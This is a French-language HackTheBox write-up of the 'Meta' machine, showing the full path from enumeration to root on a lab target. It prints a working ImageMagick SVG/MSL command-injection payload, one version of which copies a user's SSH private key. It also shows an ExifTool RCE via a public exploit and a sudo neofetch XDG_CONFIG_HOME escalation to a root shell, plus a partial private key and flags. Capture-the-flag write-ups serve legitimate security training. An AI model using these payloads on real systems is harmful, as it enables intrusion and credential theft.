---
title: Meta
date: 2025-12-11 10:28:41
categories: ["Writeups", "Hackthebox", "Machines"]
tags: ["Medium", "Linux", "Web"]
---

Meta est une machine Linux de difficulté moyenne axée sur deux CVE différentes (`CVE-2021-22204` et `CVE-2020-29599`) dans `ExifTool` et `ImageMagick`, exploitables à différentes étapes. L'accès initial est obtenu en téléchargeant un fichier malveillant vers une application web qui lit les métadonnées d'image, déclenchant une exécution de commande à distance dans ExifTool. Une injection de commande dans ImageMagick est ensuite exploitée pour pivoter vers un second utilisateur. Enfin, l'escalade de privilèges est possible grâce à un paramètre `env_keep` dans `sudo` permettant aux attaquants d'exécuter des commandes arbitraires en tant que root en définissant un répertoire de configuration personnalisé via une variable d'environnement.

## Enumération
### Scan de ports

Il y a 2 ports ouverts : `SSH` et `HTTP`.
```bash
╭─root@exegol-hackthebox /workspace/Meta
╰─➤  nmap 10.129.171.188 -T4 --min-rate 1000 -sV -sC -vv -p- -oN full-tcp-scan.txt
<snip>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 1281175a5ac9c600dbf0ed9364fd1e08 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiNHVBq9XNN5eXFkQosElagVm6qkXg6Iryueb1zAywZIA4b0dX+5xR5FpAxvYPxmthXA0E7/wunblfjPekyeKg+lvb+rEiyUJH25W/In13zRfJ6Su/kgxw9whZ1YUlzFTWDjUjQBij7QSMktOcQLi7zgrkG3cxGcS39SrEM8tvxcuSzMwzhFqVKFP/AM0jAxJ5HQVrkXkpGR07rgLyd+cNQKOGnFpAukUJnjdfv9PsV+LQs9p+a0jID+5B9y5fP4w9PvYZUkRGHcKCefYk/2UUVn0HesLNNrfo6iUxu+eeM9EGUtqQZ8nXI54nHOvzbc4aFbxADCfew/UJzQT7rovB
|   256 b5e55953001896a6f842d8c7fb132049 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEDINAHjreE4lgZywOGusB8uOKvVDmVkgznoDmUI7Rrnlmpy6DnOUhov0HfQVG6U6B4AxCGaGkKTbS0tFE8hYis=
|   256 05e9df71b59f25036bd0468d05454420 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdX83J9TLR63TPxQSvi3CuobX8uyKodvj26kl9jWUSq
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

J'ajoute le nom de domaine dans le fichier `/etc/hosts`.
```bash
echo "10.129.171.188 artcorp.htb" | tee -a /etc/hosts
```


### HTTP - TCP 80
Nous arrivons sur un site statique. Il y a de potentiels utilisateurs sur la partie `Contact`.
![](/images/Meta/Meta-1.png)

#### Énumération d'hôtes virtuels
Avec `ffuf` je trouve le l'hôte virtuel `dev01`.
```bash
╭─root@exegol-hackthebox /workspace/Meta
╰─➤  ffuf -c -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.artcorp.htb" -t 200 -fs
 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://artcorp.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.artcorp.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 132ms]
```


## Shell en tant que www-data
### ExifTool 12.23 - Arbitrary Code Execution 

J'arrive sur une page où il n'y a qu'un seul lien. Alors je clique sur le lien.
![](/images/Meta/Meta-2.png)

J'arrive sur une page où j'uploade une image. Après l'upload, cela m'affiche les métadonnées de l'image. Je crois bien qu'en arriere plan le site execute la commande `exiftool` sur notre entrée.
![](/images/Meta/Meta-3.png)

J'essaye alors d'uploader un fichier PHP, mais j'ai une erreur disant que seuls les fichiers jpg et png sont autorisés.
![](/images/Meta/Meta-4.png)

Je recherche alors des vulnerabilités sur exiftool lors de l'upload de fichiers et je tombe sur ce [Github](https://github.com/UNICORDev/exploit-CVE-2021-22204) présentant une vulnerabilité dessus. Elle date de 2021. La machine étant sortie en 2022, je décide d'y jeter un coup d'oeil. J'execute le POC qui renvoit un image malveillante contenant un payload de reverse shell.
![](/images/Meta/Meta-5.png)

J'uploade ensuite l'image et j'obtiens un shell en tant que `www-data`.
![](/images/Meta/Meta-6.png)

## Shell en tant que thomas
### CVE-2020–29599
En lançant `pspy64`, je vois le script `/usr/local/bin/convert_images.sh` qui s'exécute toutes les minutes.
```bash
www-data@meta:/tmp$ chmod +x pspy64
www-data@meta:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░


2025/07/29 06:34:01 CMD: UID=1000  PID=11493  | /bin/sh -c /usr/local/bin/convert_images.sh
2025/07/29 06:34:01 CMD: UID=1000  PID=11495  | /usr/local/bin/mogrify -format png *.*
2025/07/29 06:34:01 CMD: UID=1000  PID=11496  | /bin/bash /usr/local/bin/convert_images.sh

```

Le script place dans le répertoire `/var/www/dev01.artcorp.htb/convert_images/`. Ensuite il lance la commande `mogrify` qui convertit toutes les images du répertoire en PNG. Il tue tous les processus `mogrify` juste après. Je vois aussi que `mogrify` pointe vers `magick`, qui est une commande de `ImageMagick`.
```bash
ww-data@meta:/tmp$ cat /usr/local/bin/convert_images.sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify

www-data@meta:/tmp$ ls -la /usr/local/bin/mogrify
lrwxrwxrwx 1 root root 6 Aug 29  2021 /usr/local/bin/mogrify -> magick

```

Je trouve la version de `mogrify`
```bash
www-data@meta:/tmp$ mogrify --version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib

```

Je vois que cette version est vulnérable à une `XML Injection` dont j'ai trouvé le [POC](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html). Je crée un ficher `poc.svg` contenant le script suivant dans le répertoire `/var/www/dev01.artcorp.htb/convert_images`
```xml
<image authenticate='ff" `echo $(id) > /dev/shm/pwn`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Lorsque j'exécute le script moi même, il créé le fichier `pwn` avec la commande `id` exécutée en tant que `www-data`.
```bash
www- data@meta:/var/www/dev01.artcorp.htb/convert_images$ /usr/local/bin/convert_images.sh
/usr/local/bin/convert_images.sh: line 2: 12289 Aborted                 /usr/local/bin/mogrify -format png *.* 2> /dev/null

www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -al /dev/shm/
total 4
drwxrwxrwt  2 root     root       60 Jul 29 07:08 .
drwxr-xr-x 16 root     root     3080 Jul 29 05:13 ..
-rw-r--r--  1 www-data www-data   54 Jul 29 07:08 pwn

www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /dev/shm/pwn
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Je supprime alors le fichier et quelques secondes plus tard, il est recréé. Je vois que la commande est exécutée et nous donne les infos de `thomas`. Donc le script est exécuté en tant que `thomas`.
```bash
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -la /dev/shm
total 8
drwxrwxrwt  2 root     root       80 Jul 29 07:26 .
drwxr-xr-x 16 root     root     3080 Jul 29 05:13 ..
-rw-r--r--  1 thomas   thomas     54 Jul 29 07:26 pwn
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /dev/shm/pwn
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)

```

Je remplace alors mon payload pour récupérer la clé privée SSH de `thomas`.
```xml
<image authenticate='ff" `echo $(cat /home/thomas/.ssh/id_rsa) > /dev/shm/id_rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Quelques secondes plus tard, le fichier est créé avec le contenu de la clé.
```bash
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -la /dev/shm/
total 12
drwxrwxrwt  2 root     root      100 Jul 29 07:29 .
drwxr-xr-x 16 root     root     3080 Jul 29 05:13 ..
-rw-r--r--  1 thomas   thomas   2590 Jul 29 07:29 id_rsa
-rw-r--r--  1 thomas   thomas     54 Jul 29 07:26 pwn
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /dev/shm/id_rsa
-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE= -----END OPENSSH PRIVATE KEY-----

```

La clé est mal formatée, donc j'ai demandé à ChatGPT de bien la formater. Je me connecte alors avec elle par SSH en tant que `thomas`.
```bash
╭─root@exegol-hackthebox /workspace/Meta ‹main*›
╰─➤  chmod 600 thomas.rsa
╭─root@exegol-hackthebox /workspace/Meta ‹main*›
╰─➤  ssh -i thomas.rsa thomas@10.129.171.188
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
thomas@meta:~$ id
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
thomas@meta:~$ ls -la
total 36
drwxr-xr-x 5 thomas thomas 4096 Jul 29 07:36 .
drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..
lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -> /dev/null
-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout
-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc
drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config
drwx------ 3 thomas thomas 4096 Jul 29 07:36 .gnupg
-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile
drwx------ 2 thomas thomas 4096 Jan  4  2022 .ssh
-rw-r----- 1 root   thomas   33 Jul 29 05:14 user.txt
thomas@meta:~$ cat user.txt
765b5ad02b7c8a9f7e9c71ce3fb274f9

```

## Shell en tant que root
### Neofetch
Avec un `sudo -l`, je vois que je peux exécuter la commande suivante.
```bash
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:  
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,   
    env_keep+=XDG_CONFIG_HOME  
  
User thomas may run the following commands on meta:  
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

Je peux exécuter `sudo /usr/bin/neofetch \"\"` en tant que root. La variable `XDG_CONFIG_HOME` permet de charger le fichier de configuration de `neofetch` qui se trouve etre le fichier `/home/thomas/.config/neofetch/config.conf`. Donc si j'injecte du code malveillant dans le fichier de configuration de `neofetch` et que je le charge avec cette variable, le code sera exécuté en tant que `root`.
```bash
thomas@meta:~$ echo 'exec /bin/bash' > /home/thomas/.config/neofetch/config.conf
thomas@meta:~$ export XDG_CONFIG_HOME="$HOME/.config"
thomas@meta:~$ sudo /usr/bin/neofetch \"\"
root@meta:/home/thomas# id
uid=0(root) gid=0(root) groups=0(root)
root@meta:/home/thomas# cd /root
root@meta:~# ls
conf  root.txt
root@meta:~# cat root.txt
a2ecf2cf413b452ea7e380b7ae6f0519
```
